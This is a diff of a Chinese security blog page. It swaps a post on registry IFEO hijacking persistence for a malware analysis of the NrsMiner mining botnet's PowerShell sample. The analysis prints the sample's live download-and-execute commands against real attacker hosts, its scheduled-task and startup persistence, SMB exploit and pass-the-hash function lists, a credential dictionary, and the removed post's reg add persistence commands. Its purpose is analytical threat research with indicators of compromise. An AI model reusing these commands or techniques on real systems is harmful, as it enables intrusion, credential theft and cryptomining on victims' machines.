@@ -2,9 +2,9 @@
 <html>
 <head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
-  <title>映像劫持的新老玩法 | 九世的博客</title>
-  <meta name="keywords" content=" 后门 ">
-  <meta name="description" content="映像劫持的新老玩法 | 九世的博客">
+  <title>NrsMiner挖矿僵尸网络 | 九世的博客</title>
+  <meta name="keywords" content=" 恶意分析 ">
+  <meta name="description" content="NrsMiner挖矿僵尸网络 | 九世的博客">
     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 <meta name="description" content="Become a hacker">
 <meta property="og:type" content="website">
@@ -1654,9 +1654,9 @@
 </aside>
 <div class="post">
     <div class="pjax">
-        <article id="post-映像劫持的新老玩法" class="article article-type-post" itemscope="" itemprop="blogPost">
+        <article id="post-NrsMiner挖矿僵尸网络分析" class="article article-type-post" itemscope="" itemprop="blogPost">
     
-        <h1 class="article-title">映像劫持的新老玩法</h1>
+        <h1 class="article-title">NrsMiner挖矿僵尸网络</h1>
     
     <div class="article-meta">
         
@@ -1665,14 +1665,14 @@
         
         <span class="tag">
             
-            <a href="javascript:" class="color3">后门</a>
+            <a href="javascript:" class="color5">恶意分析</a>
             
         </span>
         
     </div>
     <div class="article-meta">
         
-        创建时间:<time class="date" title="更新时间: 2020-02-23 21:22:05">2020-02-23 21:08</time>
+        创建时间:<time class="date" title="更新时间: 2021-03-06 23:43:36">2021-03-06 22:51</time>
         
     </div>
     <div class="article-meta">
@@ -1694,7 +1694,7 @@
     
     <div class="toc-ref">
     
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#image-hijack"><span class="toc-text">image hijack</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#前言"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#分析过程"><span class="toc-text">分析过程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#后续"><span class="toc-text">后续</span></a></li></ol>
     
 <style>
     .left-col .switch-btn,
@@ -1709,26 +1709,508 @@
 </div>
     <div class="article-entry" itemprop="articleBody">
       
-        <iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=440073051&auto=1&height=66"></iframe>
+        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>下午在群里看见一<code>app.any.run</code>的链接，没啥事情做分析了一下。做个记录</p>
+<h2 id="分析过程"><a href="#分析过程" class="headerlink" title="分析过程"></a>分析过程</h2><p>样本名称:shady.ps1<br>sha256:1a3960eaf2021049e1eaed4c76029420a62c881f65533b3741be2050328a2ac4<br>sha1:6b294f6ad208cb7d23172cafbccf3db3d78b2c62<br>md5:5474aa765ddd0c1dff33e5bbe4aba272    </p>
+<p><code>shady.ps1</code>打开一看 ，混淆国的<br><img src="https://s3.ax1x.com/2021/03/06/6uhpx1.png" alt=""></p>
+<p>定位到函数结尾，发现IEX<br><img src="https://s3.ax1x.com/2021/03/06/6u4YTO.png" alt=""></p>
+<p>写到新的ps1，整体如下<br><img src="https://s3.ax1x.com/2021/03/06/6u4snP.png" alt=""></p>
+<p>函数列表</p>
+<pre><code>function make_smb1_anonymous_login_packet 
+function smb1_anonymous_login($sock)
+function negotiate_proto_request()
+function smb_header($smbheader) 
+function smb1_get_response($sock)
+function client_negotiate($sock)
+function tree_connect_andx($sock, $target, $userid)
+function tree_connect_andx_request($target, $userid) 
+function smb1_anonymous_connect_ipc($target)
+function make_smb1_nt_trans_packet($tree_id, $user_id) 
+function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) 
+function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) 
+function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)
+function createSessionAllocNonPaged($target, $size) 
+function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) 
+function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)
+function make_smb2_payload_headers_packet()
+function eb7($target ,$shellcode) 
+function createFakeSrvNetBuffer8($sc_size)
+function createFeaList8($sc_size, $ntfea)
+function  make_smb1_login8_packet8 
+function  make_ntlm_auth_packet8($user_id) 
+function smb1_login8($sock)
+function negotiate_proto_request8($use_ntlm)
+function smb_header8($smbheader) 
+function smb1_get_response8($sock)
+function client_negotiate8($sock , $use_ntlm)
+function tree_connect_andx8($sock, $target, $userid)
+function tree_connect_andx8_request($target, $userid)  
+function make_smb1_nt_trans_packet8($tree_id, $user_id)  
+function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) 
+function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)
+function createSessionAllocNonPaged8($target, $size) 
+function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  
+function make_smb2_payload_headers_packet8($for_nx)
+function eb8($target,$sc)   
+function localscan 
+function geth 
+function LoadApi
+function sid_to_key($sid)
+function str_to_key($s)
+function NewRC4([byte[]]$key)
+function des_encrypt([byte[]]$data, [byte[]]$key)
+function des_decrypt([byte[]]$data, [byte[]]$key)
+function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
+function Get-RegKeyClass([string]$key, [string]$subkey)
+function Get-BootKey
+function Get-HBootKey
+function Get-UserName([byte[]]$V)
+function Get-UserHashes($u, [byte[]]$hbootkey)
+function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
+function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
+function Get-UserKeys
+function DumpHashes
+function Invoke-Mypass
+Function LGDJSR
+Function Get-WiSDGKDants
+Function Get-l64ftion
+Function bud-ksgLHDnwn
+Function Add-SignedIntAsUnsigned
+Function Compare-Val1GreaterThanVal2AsUInt
+Function Convert-UIntToInt
+Function Test-MemoryRangeValid
+Function Write-BytesToMemory
+Function Get-DelegateType
+Function klsdjlkhfDjswpdy
+Function Enable-SeDebugPrivilege
+Function sadkjhdsjD
+Function Get-ImageNtHeaders
+Function DHWE-kidD
+Function KDHSD-JUWF
+Function HDSK-OUHF
+Function KJSHDeUFHEF7
+Function Cthis-SectioDSns
+Function LSHDjh3-upd
+Function lhsdu-jsd
+Function SDhk34JSD
+Function usdKdhdf
+Function KSHDUWKHF
+Function SDHlhuhWEDSDDS
+Function GessKUDBSD
+Function LHSDGUKsdHF
+Function SDLHLESDME
+Function Main
+Function Main
+function Invoke-SE
+function ConvertFrom-PacketOrderedDictionary
+function New-PacketNetBIOSSessionService
+function New-PacketSMBHeader
+function New-PacketSMBNegotiateProtocolRequest
+function New-PacketSMBSessionSetupAndXRequest
+function New-PacketSMBTreeConnectAndXRequest
+function New-PacketSMBNTCreateAndXRequest
+function New-PacketSMBReadAndXRequest
+function New-PacketSMBWriteAndXRequest
+function New-PacketSMBCloseRequest
+function New-PacketSMBTreeDisconnectRequest
+function New-PacketSMBLogoffAndXRequest
+function New-PacketSMB2Header
+function New-PacketSMB2NegotiateProtocolRequest
+function New-PacketSMB2SessionSetupRequest
+function New-PacketSMB2TreeConnectRequest
+function New-PacketSMB2CreateRequestFile
+function New-PacketSMB2ReadRequest
+function New-PacketSMB2WriteRequest
+function New-PacketSMB2CloseRequest
+function New-PacketSMB2TreeDisconnectRequest
+function New-PacketSMB2SessionLogoffRequest
+function New-PacketNTLMSSPNegotiate
+function New-PacketNTLMSSPAuth
+function New-PacketRPCBind
+function New-PacketRPCRequest
+function New-PacketSCMOpenSCManagerW
+function New-PacketSCMCreateServiceW
+function New-PacketSCMStartServiceW
+function New-PacketSCMDeleteServiceW
+function New-PacketSCMCloseServiceHandle
+function Get-StatusPending
+function Get-UInt16DataLength
+function Invoke-SMBC
+function ConvertFrom-PacketOrderedDictionary
+function New-PacketNetBIOSSessionService
+function New-PacketSMBHeader
+function New-PacketSMBNegotiateProtocolRequest
+function New-PacketSMBSessionSetupAndXRequest
+function New-PacketSMB2Header
+function New-PacketSMB2NegotiateProtocolRequest
+function New-PacketSMB2SessionSetupRequest
+function New-PacketSMB2TreeConnectRequest
+function New-PacketSMB2CreateRequest
+function New-PacketSMB2FindRequestFile
+function New-PacketSMB2QueryInfoRequest
+function New-PacketSMB2ReadRequest
+function New-PacketSMB2WriteRequest
+function New-PacketSMB2CloseRequest
+function New-PacketSMB2TreeDisconnectRequest
+function New-PacketSMB2SessionLogoffRequest
+function New-PacketSMB2IoctlRequest()
+function New-PacketSMB2SetInfoRequest
+function New-PacketNTLMSSPNegotiate
+function New-PacketNTLMSSPAuth
+function Get-UInt16DataLength
+function copyrun 
+function smb1_anonymous_login($sock)
+function negotiate_proto_request()
+function smb_header($smbheader) 
+function smb1_get_response($sock)
+function client_negotiate($sock)
+function tree_connect_andx($sock, $target, $userid)
+function tree_connect_andx_request($target, $userid) 
+function smb1_anonymous_connect_ipc($target)
+function make_smb1_nt_trans_packet($tree_id, $user_id) 
+function make_smb1_trans2_exploit_packet($tree_id, $user_id, $data, $timeout) 
+function make_smb1_trans2_last_packet($tree_id, $user_id, $data, $timeout) 
+function send_big_trans2($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)
+function createSessionAllocNonPaged($target, $size) 
+function make_smb1_free_hole_session_packet($flags2, $vcnum, $native_os) 
+function smb2_grooms($target, $grooms, $payload_hdr_pkt, $groom_socks)
+function make_smb2_payload_headers_packet()
+function eb7($target ,$shellcode) 
+function createFakeSrvNetBuffer8($sc_size)
+function createFeaList8($sc_size, $ntfea)
+function  make_ntlm_auth_packet8($user_id) 
+function smb1_login8($sock)
+function negotiate_proto_request8($use_ntlm)
+function smb_header8($smbheader) 
+function smb1_get_response8($sock)
+function client_negotiate8($sock , $use_ntlm)
+function tree_connect_andx8($sock, $target, $userid)
+function tree_connect_andx8_request($target, $userid)  
+function make_smb1_nt_trans_packet8($tree_id, $user_id)  
+function make_smb1_trans2_exploit_packet8($tree_id, $user_id, $data, $timeout) 
+function send_big_trans28($sock, $smbheader, $data, $firstDataFragmentSize, $sendLastChunk)
+function createSessionAllocNonPaged8($target, $size) 
+function  make_smb1_free_hole_session_packet8($flags2, $vcnum, $native_os)  
+function make_smb2_payload_headers_packet8($for_nx)
+function eb8($target,$sc)   
+function sid_to_key($sid)
+function str_to_key($s)
+function NewRC4([byte[]]$key)
+function des_encrypt([byte[]]$data, [byte[]]$key)
+function des_decrypt([byte[]]$data, [byte[]]$key)
+function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
+function Get-RegKeyClass([string]$key, [string]$subkey)
+function Get-UserName([byte[]]$V)
+function Get-UserHashes($u, [byte[]]$hbootkey)
+function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
+function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
+function New-PacketSMB2IoctlRequest()
+</code></pre><p><strong>执行过程</strong></p>
+<pre><code>-5获取所有用户名添加到用户列表
+    匹配普通用户SID的正则:
+        添加到$alluser列表
+-4检查当前用户是不是管理员
+    获取本机hash:
+        用户标志位(变量名:$un)
+        用户hash(变量名:$hs)
+        匹配出是管理员的hash
+            添加到用户列表(变量名:alluser)
+            添加到hash列表(变量名:$allhash)
+-3获取明文密码和NTLM HASH
+    匹配出用户名(变量名:$mm)
+    匹配出明文密码(变量名:$pp)
+    匹配出NTLM HASH(变量名:$nn)
+    匹配出域名(变量名:$dd)
+    用户名不为空:
+        添加到$getusers列表
+        添加到$alluser列表
+    明文密码不为空:
+        添加到$getpasswd列表
+        添加到$allpass列表
+    函数不为空(31d6cfe0d16ae931b73c59d7e0c089c0为空hash):
+        添加到$gethashs列表
+        添加到$allhash列表
+    域名不为空、不为workgroup组、不为本地计算机名:
+        添加到$getdomain组
+</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIpxs.png" alt=""></p>
+<p>之后循环执行以下内容</p>
+<pre><code>while(true)循环执行:
+    1.线程休眠200秒
+    2.创建名为Global\PSexec的互斥锁
+    3.获取第一张网卡的MAC地址
+    4.获取杀毒软件
+    5.如果存在杀毒 (条件判断)
+        True:$av变量为将杀毒名称以:&lt;name&gt;|&lt;name&gt;的格式拼接在一起，例如:Windows Defender|360安全卫士|
+        False:$av变量为空
 
-<h2 id="image-hijack"><a href="#image-hijack" class="headerlink" title="image hijack"></a>image hijack</h2><p>映像劫持（IFEO）</p>
-<p>作用：劫持对应的程序后，打开该程序运行的是别的程序，比如运行A.exe打开的则是CALC.exe<br>注册表路径：HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options<br>用法：在注册表路径下创建一个项，项名为要劫持的exe名称，并在该项创建一个Debugger的键值，键值填运行的恶意EXE。或者在已经创建的项里创建Debugger键填入键值，运行那个exe就会被劫持</p>
-<pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe&quot; /v Debugger /t REG_SZ /d C:\Windows\System32\calc.exe
-</code></pre><p><img src="https://s2.ax1x.com/2020/02/23/339V61.png" alt=""></p>
-<p>效果图：<br><img src="https://s2.ax1x.com/2020/02/23/339lfH.gif" alt=""></p>
-<p>映像劫持新玩法：</p>
-<p><a href="https://www.anquanke.com/post/id/151425" target="_blank" rel="noopener">https://www.anquanke.com/post/id/151425</a><br>效果：程序A静默退出结束后，会执行程序B。<br>注册表路径：</p>
-<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;劫持的exe名称&gt;
-HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\&lt;劫持的exe名称&gt;
-</code></pre><p>劫持notepad.exe示例：</p>
-<pre><code>reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options&quot; /v notepad.exe /t REG_DWORD /d 512
-reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v MonitorProcess /t REG_SZ /d C:\Windows\System32\calc.exe
-reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe&quot; /v ReportingMode /t REG_DWORD /d 1
-</code></pre><p><img src="https://s2.ax1x.com/2020/02/23/339gBV.gif" alt=""></p>
-<p>代替映像劫持的注册表路径</p>
-<pre><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths\&lt;要劫持的exe名&gt;
-</code></pre><p>Defualt键值为要运行的恶意exe路径<br><img src="https://s2.ax1x.com/2020/02/23/33CSgA.md.png" alt=""></p>
-<p><img src="https://s2.ax1x.com/2020/02/23/33CpjI.gif" alt=""></p>
+    6.拼接url格式:http://p.estonine.com/getnew.php?ver=2020&amp;mac=&lt;网卡mac地址&gt;&amp;re=&amp;pid=&lt;当前进程pid&gt;&amp;av=&lt;杀毒名称&gt;&amp;ver=&lt;系统版本&gt;&amp;bit=&lt;系统位数&gt;
+    7.从url请求对应的内容读取内容后将##替换为空base64解码执行下载的内容
+    8.调用localscan函数检查本地和内网445端口判断是否开启
+    9.调用localscan函数检查本地和内网65353端口判断是否开启
+    10.$Bserver数组不存在该IP调用copyrun函数
+        调用Invoke-SMBC函数hash传递攻击
+        传递成功:调用Invoke-SE函数hash传递攻击执行开启防火墙和设置计划任务，和上传文件到指定路径(如果源路径存在该文件则删除)
+                    netsh.exe firewall add portopening tcp 65353 DNS&amp;netsh interface portproxy add v4tov4 listenport=65353 connectaddress=1.1.1.1 connectport=53
+                    schtasks /create /ru system /sc MINUTE /mo 40 /st 07:00:00 /tn Sync /tr &quot;powershell -nop -ep bypass -e SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBkAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AcAAuAGUAcwB0AG8AbgBpAG4AZQAuAGMAbwBtAC8AcAA/AHMAbQBiACcAKQA=&quot; /F #解码base64:IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/p?smb&#39;)
+                    schtasks /run /tn Sync&#39;
+
+                    上传文件到:
+                        C:\Users\&lt;Name&gt;\AppData\Roaming\sign.txt 内容0:
+                        C:\Users\&lt;Name&gt;\AppData\Roaming\flashplayer.tmp 内容:try{(new ActiveXObject(&quot;WScript.Shell&quot;)).Run(&quot;powershell -w hidden -ep bypass -c while($True){try{IEX (New-Object Net.WebClient).downloadstring(&#39;http://p.estonine.com/low?ipc&#39;)}catch{Sleep -m 2500000}}&quot;,0,false);}catch(e){}
+                        C:\Users\&lt;Name&gt;\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\FlashPlayer.lnk 快捷方式指向的目标:C:\Windows\system32\wscript.exe //e:javascript &quot;%appdata%\flashplayer.tmp&quot;
+
+        传递失败:
+    11.MS17010扫描攻击
+    12.休眠100秒
+</code></pre><p><img src="https://s3.ax1x.com/2021/03/06/6uIMs1.png" alt=""></p>
+<p><img src="https://s3.ax1x.com/2021/03/06/6uIWyn.png" alt=""></p>
+<p>提取出来的快捷方式<br><img src="https://s3.ax1x.com/2021/03/06/6uoZ0P.png" alt=""></p>
+<p>脚本内嵌用户名字典和hash表和明文密码表<br>用户列表:</p>
+<pre><code>administrator
+admin
+</code></pre><p>hash表</p>
+<pre><code>32ed87bdb5fdc5e9cba88547376818d4
+8846f7eaee8fb117ad06bdd830b7586c
+259745cb123a52aa2e693aaacca2db52
+2d20d252a479f485cdf5e171d93985bf
+c22b315c040ae6e0efee3518d830362b
+7a21990fcd3d759941e45c490f143d5f
+7ce21f17c0aee7fb9ceba532d0546ad6
+2d7f1a5a61d3a96fb5159b5eef17adc6
+328727b81ca05805a68ef26acb252039
+f7eb9c06fafaa23c4bcf22ba6781c1e2
+579110c49145015c47ecd267657d3174
+320a78179516c385e35a93ffa0b1c4ac
+f9e37e83b83c47a93c2f09f66408631b
+31fc0dc8f7dfad0e8bd7ccc3842f2ce9
+f2477a144dff4f216ab81f2ac3e3207d
+becedb42ec3c5c7f965255338be4453c
+ccd3d95ea08b81140eee3cfbb98c68f1
+8d4ef8654a9adc66d4f628e94f66e31b
+6d3986e540a63647454a50e26477ef94
+e8cd0e4a9e89eab931dc5338fcbec54a
+0d757ad173d2fc249ce19364fd64c8ec
+af27efb60c7b238910efe2a7e0676a39
+74ed32086b1317b742c3a92148df1019
+8af326aa4850225b75c592d4ce19ccf5
+bb53a477af18526ada697ce2e51f76b3
+4057b60b514c5402dde3d29a1845c366
+27cd214350e6172ce708ee05f9d6d70a
+72f5cfa80f07819ccbcfb72feb9eb9b7
+f67f5e3f66efd7298be6acd32eeeb27c
+1d7774d5bbec877ba1bbfcac2f1ae296
+1c4ecc8938fb93812779077127e97662
+6920c58d0df184d829189c44fafb7ece
+3fa45a060bd2693ae4c05b601d05ca0c
+152efbcfafeb22eabda8fc5e68697a41
+ad70819c5bc807280974d80f45982011
+c4e9cf8a64cfa6893e2fb666cd566d48
+f40460fe1ceec6f6785997f3319553bb
+1b46daf193bb579bdb3b8c6f09637ecc
+ee9423d5425f22baf082877edf0a5223
+820b13c5212be1f85048d7cc8f70bfa5
+08381a7cb6f73d13260089df6015b7b4
+69cbe3acbc48a3a289e8cdb000c2b7a8
+20b2a7351c899fd8e230caad9dd9b994
+bcd285980e1d9b302e16875844ef6977
+59dea36d05aacaa547de42e9956678e7
+162e829be112225fedf856e38e1c65fe
+9f8cc8c6e9e8ba3344ce00078175a4ff
+f9e37e83b83c47a93c2f09f66408631b
+faf94587adbfb93df82380f7ca2be801
+711417f28b0f8d2c5c1cde9554cf8f88
+acf586e39c5838baeea66ec864d7c437
+114a90eadeb78697e8f5d14888324caf
+3837b6534834cc2a88c58bf90b2d96f4
+48d28627b7f196284b73f3c6fae4eded
+8a72db9f0eea602e3770c45cd3ed9bcd
+bdc2ef9d128643a227639d2f142d1434
+ba48d0d7833d929ba60030ae19a63875
+b20b89488f6f2decabf80294727a0430
+6e2ba7aaa0297ecba56e3d90393bc147
+324e773ec800dc70882568f5a41d2b63
+62b26c13b70e7d5a9724710a41e63688
+f5c864e939801f4f239ff455c33730f8
+21da95b451c2736231eedb87d08f7edb
+cd73b0aeeb2d1c1907c8783a05e8dd08
+c0d1ba5fcad640041f86f8060b384915
+b6d9897df4bb61b416fa405159418033
+aaf9f89a2d4d0cef5f8912461132b30f
+fac5d668099409cb6fa223a32ea493b6
+2386e5c805ab8dff955fdb893df85f47
+f96ab5f0c4b478ee16d9520e4eb43184
+17dc1cd2340de61ee329d2bb291acb56
+ed356698adc4fcffe90c3e6d250fcf16
+7b592e4f8178b4c75788531b2e747687
+47bf8039a8506cd67c524a03ff84ba4e
+5ae7b89b3afea28d448ed31b5c704289
+73f5d97549f033374fa6d9f9ce247ffd
+e5ae562ddfaa6b446c32764ab1ebf3ed
+161cff084477fe596a5db81874498a24
+a87f3a337d73085c45f9416be5787d86
+00affd88fa323b00d4560bf9fef0ec2f
+69943c5e63b4d2c104dbbcc15138b72b
+588feb889288fb953b5f094d47d1565c
+3dbde697d71690a769204beb12283678
+df54de3f3438343202c1dd523d0265be
+f1351ac828428d74f6da2968089fc91f
+b3ec3e03e2a202cbd54fd104b8504fef
+a80c9cc3f8439ada25af064a874efe2d
+13b29964cc2480b4ef454c59562e675c
+de26cce0356891a4a020e7c4957afc72
+e19ccf75ee54e06b06a5907af13cef42
+30fcaa8ad9a496b3e17f7fbfacc72993
+41630abb825ca50da31ce1fac1e9f54d
+f56a8399599f1be040128b1dd9623c29
+2e4dbf83aa056289935daea328977b20
+b9f917853e3dbf6e6831ecce60725930
+5835048ce94ad0564e29a924a03510ef
+a4141712f19e9dd5adf16919bb38a95c
+</code></pre><p>明文密码</p>
+<pre><code>123456
+password
+12345678
+qwerty
+123456789
+12345
+1234
+111111
+1234567
+dragon
+123123
+baseball
+abc123
+football
+monkey
+letmein
+696969
+shadow
+master
+666666
+qwertyuiop
+123321
+mustang
+1234567890
+michael
+654321
+pussy
+superman
+1qaz2wsx
+7777777
+fuckyou
+121212
+000000
+qazwsx
+123qwe
+killer
+a123456
+a123456789
+woaini1314
+qq123456
+abc123456
+123456a
+123456789a
+147258369
+zxcvbnm
+987654321
+12345678910
+abc123
+qq123456789
+123456789.
+7708801314520
+woaini
+5201314520
+q123456
+123456abc
+1233211234567
+123123123
+123456.
+0123456789
+asd123456
+aa123456
+135792468
+q123456789
+abcd123456
+12345678900
+woaini520
+woaini123
+zxcvbnm123
+1111111111111111
+w123456
+aini1314
+abc123456789
+PASSWORD
+Aa123456
+qwer12345
+123@abc
+123!@#qwe
+1qaz@WSX
+Passw0rd
+123qwe!@#
+1
+12
+123
+321
+888888
+abcd1234
+p@ssword
+P@ssword
+p@ssw0rd
+P@ssw0rd
+P@SSWORD
+P@SSW0RD
+P@$$w0rd
+P@$$word
+passw0rd
+password1
+administrator
+</code></pre><p>其中计划任务里的url，下载的另外个ps1。其实就是一开始混淆过的ps1，用于权限维持(下载的update.png)<br>1.获取首个网卡MAC地址<br>2.互斥锁创建<br>3.检查C:\Windows\Temp\xxx.log是否存在，不存在则创建Winnet计划任务<br>4.休眠随机1-20秒<br>5.检查进程运行的命令是否带有downloadstring,没有远程下载执行</p>
+<pre><code class="powershell">[string]$mac = (getmac /FO CSV|Select-Object -Skip 1 -first 1| ConvertFrom-Csv -Header MAC|select-object -expand MAC) #首个网卡MAC地址
+try{
+        $name = &#39;Global\PSEXEC&#39;
+        $exeflag = $flase
+        New-Object System.Threading.Mutex ($true,$name,[ref]$exeflag) #互斥锁创建
+}catch{}
+
+$dt = Get-Date -Format &#39;yyMMdd&#39; #日期格式化
+$path = &quot;$env:temp\\ccc.log&quot;
+[string]$flag = test-path $path #检查路径是否存在
+$permit =  ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] &quot;Administrator&quot;) #判断当前用户是否位管理员
+$key = &quot;mac=&quot;+$mac+&quot;&amp;av=&quot;+$av+&quot;&amp;version=&quot;+(Get-WmiObject -Class Win32_OperatingSystem).version+&quot;&amp;bit=&quot;+(Get-WmiObject Win32_OperatingSystem).OSArchitecture + &quot;&amp;flag2=&quot; + $flag + &quot;&amp;domain=&quot; + (Get-WmiObject win32_computersystem).Domain + &quot;&amp;user=&quot; + $env:USERNAME + &quot;&amp;PS=&quot; + $exeflag
+if($flag -eq &#39;False&#39;){
+        New-Item $path -type file
+        if($permit){
+                try{
+                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?hig&quot; + $dt + &quot;&#39;)&quot;
+                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+                    $bcode = [Convert]::ToBase64String($Bytes)
+                    $scexec = &quot;/create /ru system /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39; #创建计划任务
+                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;
+                }catch{}
+        }else{
+                try{
+                    $Text = &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;http://cdn.chatcdn.net/p?low&quot; + $dt + &quot;&#39;)&quot;
+                    $Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
+                    $bcode = [Convert]::ToBase64String($Bytes)
+                    $scexec = &quot;/create /sc MINUTE /mo 45 /tn Winnet /tr &quot; + &#39;&quot;&#39; + &quot;powershell -ep bypass -e $bcode&quot; + &#39;&quot; /F&#39;
+                    Start-Process -FilePath schtasks.exe -ArgumentList &quot;$scexec&quot;
+                }catch{}
+        }
+        &amp;schtasks /run /tn &quot;Winnet&quot; #创建另外个计划任务
+}else{}
+
+sleep (get-random -inputobject (1..20)) #休眠1-20秒
+try{
+        $run = Get-WmiObject Win32_Process | select commandline | Select-String -Pattern &quot;downloadstring&quot; #检查进程运行的命令是否带有downloadstring,没有远程下载执行
+        if(($run.length -lt 0) -and $exeflag){
+            $onps = &quot;/c powershell -nop -w hidden -ep bypass -c &quot; + &#39;&quot;&#39; + &quot;IEX (New-Object Net.WebClient).downloadstring(&#39;&quot; + &quot;http://188.166.162.201/update.png?&amp;&quot; + $key + &quot;&#39;)&quot; + &#39;&quot;&#39;
+            Start-Process -FilePath cmd.exe -ArgumentList &quot;$onps&quot;
+        }else{}
+}catch{}
+kill $pid
+</code></pre>
+<p>IP:188.166.162.201<br>脚本内的某些函数来源于:<a href="https://github.com/Kevin-Robertson/Invoke-TheHash" target="_blank" rel="noopener">https://github.com/Kevin-Robertson/Invoke-TheHash</a><br>原ps1下载地址:<a href="http://188.166.162.201/update.png?mac=&amp;av=" target="_blank" rel="noopener">http://188.166.162.201/update.png?mac=&amp;av=</a>&lt;av_name&gt;&amp;version=&lt;os_version&gt;&amp;bit=&lt;os_arch&gt;&amp;flag2=&amp;domain=<groupname>&amp;user=<username>&amp;PS=False<br>后续下载地址:<a href="http://pslog.estonine.com/logging.php" target="_blank" rel="noopener">http://pslog.estonine.com/logging.php</a> <a href="http://p.estonine.com/p?smb" target="_blank" rel="noopener">http://p.estonine.com/p?smb</a> <a href="http://p.estonine.com/low?ipc" target="_blank" rel="noopener">http://p.estonine.com/low?ipc</a><br>微步查询:<br><a href="https://x.threatbook.cn/nodev4/domain/p.estonine.com" target="_blank" rel="noopener">https://x.threatbook.cn/nodev4/domain/p.estonine.com</a><br><a href="https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880" target="_blank" rel="noopener">https://s.threatbook.cn/report/url/6cd928964549ac59800c167a4529c880</a></username></groupname></p>
+<p>update.png MD5:e279958da1c4dc11eb3a77909fce551e</p>
+<h2 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h2><p>能力有限，有没分析出来的见谅</p>
 
       
        <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。 </span>
@@ -1738,12 +2220,12 @@ reg add &quot;HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Si
 
 
 <div class="article_copyright">
-    <p><span class="copy-title">文章标题:</span>映像劫持的新老玩法</p>
+    <p><span class="copy-title">文章标题:</span>NrsMiner挖矿僵尸网络</p>
     
     <p><span class="copy-title">本文作者:</span><a href="javascript:void(0)" title="九世">九世</a></p>
-    <p><span class="copy-title">发布时间:</span>2020-02-23, 21:08:35</p>
-    <p><span class="copy-title">最后更新:</span>2020-02-23, 21:22:05</p>
-    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/9a523925.html" title="映像劫持的新老玩法">http://422926799.github.io/posts/9a523925.html</a>
+    <p><span class="copy-title">发布时间:</span>2021-03-06, 22:51:28</p>
+    <p><span class="copy-title">最后更新:</span>2021-03-06, 23:43:36</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/posts/855d1ef5.html" title="NrsMiner挖矿僵尸网络">http://422926799.github.io/posts/855d1ef5.html</a>
     <p>
         <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" title="CC BY-NC-SA 4.0 International" target="_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
     </p>
